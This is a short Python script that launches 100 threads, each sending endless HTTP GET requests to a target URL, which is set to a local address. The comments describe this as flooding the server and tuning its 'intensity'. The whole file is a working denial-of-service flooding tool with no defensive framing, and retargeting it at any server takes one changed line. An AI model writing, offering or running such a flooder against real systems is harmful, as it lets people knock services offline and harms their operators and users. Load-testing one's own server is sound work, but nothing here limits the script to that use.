import requests
import threading
import time

# Target information
target = "http://127.0.0.1:8080/"

# Function to send requests
def flood():
    while True:
        try:
            response = requests.get(target, timeout=1)  # Send HTTP GET request
            print(f"Response Code: {response.status_code}")  # Monitor responses
        except requests.exceptions.RequestException:
            # Ignore connection errors
            pass

# Launch multiple threads to flood the server
for i in range(100):  # Adjust thread count for intensity
    thread = threading.Thread(target=flood)
    thread.daemon = True
    thread.start()

# Keep the main program running
while True:
    time.sleep(1)

